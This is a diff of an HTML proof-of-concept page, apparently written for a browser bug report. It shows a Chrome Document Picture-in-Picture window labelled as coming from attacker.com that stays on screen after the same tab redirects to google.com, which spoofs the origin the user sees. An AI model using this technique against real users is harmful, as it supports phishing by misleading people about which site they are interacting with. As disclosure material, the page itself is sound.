@@ -1,52 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>Attacker - Document PiP Test</title>
-</head>
 <body>
-<h3>Step 1: Click Open PiP</h3>
-<button id="open" style="padding:10px 20px;font-size:16px;">Open PiP</button>
-<br><br>
-<h3>Step 2: After PiP open, go to google.com</h3>
-<a href="https://www.google.com" target="_blank">Open google.com in new tab</a>
+<h3>PoC S3 - 1 Tab Redirect</h3>
+<button id="open">1. Open PiP</button>
+<button id="go">2. Go to google.com (same tab)</button>
 
 <script>
+let pipWin = null;
 document.getElementById('open').onclick = async () => {
-  if (!('documentPictureInPicture' in window)) {
-    alert('Need Chrome Desktop 111+');
-    return;
-  }
-  const pipWin = await documentPictureInPicture.requestWindow({
-    width: 350,
-    height: 200
-  });
+  pipWin = await documentPictureInPicture.requestWindow({width: 350, height: 200});
+  pipWin.document.body.innerHTML = `
+    <style>body{font-family:sans-serif;text-align:center}</style>
+    <h3>This PiP is from attacker.com</h3>
+    <p>Main bar will be google.com</p>
+    <button id="btn" onclick="this.textContent='Clicked! From attacker.com but bar=google.com'; this.style.background='red'">Click Me</button>
+  `;
+};
 
-  // === MULAI CODE PIP YANG BENAR ===
-  pipWin.document.body.innerHTML = "";
-  
-  const style = pipWin.document.createElement('style');
-  style.textContent = `body{margin:0;font-family:sans-serif} .head{padding:8px;background:#f1f3f4;border-bottom:1px solid #ccc;font-size:12px} .box{padding:15px;text-align:center} button{padding:8px 15px;background:#1a73e8;color:white;border:0;border-radius:4px;cursor:pointer}`;
-  pipWin.document.head.appendChild(style);
-
-  const head = pipWin.document.createElement('div');
-  head.className = 'head';
-  head.textContent = 'attacker.com PiP - no origin in main UI';
-  pipWin.document.body.appendChild(head);
-
-  const box = pipWin.document.createElement('div');
-  box.className = 'box';
-  box.innerHTML = '<b>Clickable test</b><br><br>';
-  pipWin.document.body.appendChild(box);
-
-  const btn = pipWin.document.createElement('button');
-  btn.textContent = 'Click Me - Test';
-  btn.addEventListener('click', () => {
-    btn.textContent = 'Clicked! From attacker.com but bar=google.com';
-    btn.style.background = 'red';
-  });
-  box.appendChild(btn);
-  // === SELESAI ===
+document.getElementById('go').onclick = () => {
+  // INI KUNCINYA: redirect tab yang sama, bukan window.open
+  window.location.href = 'https://www.google.com';
 };
 </script>
 </body>
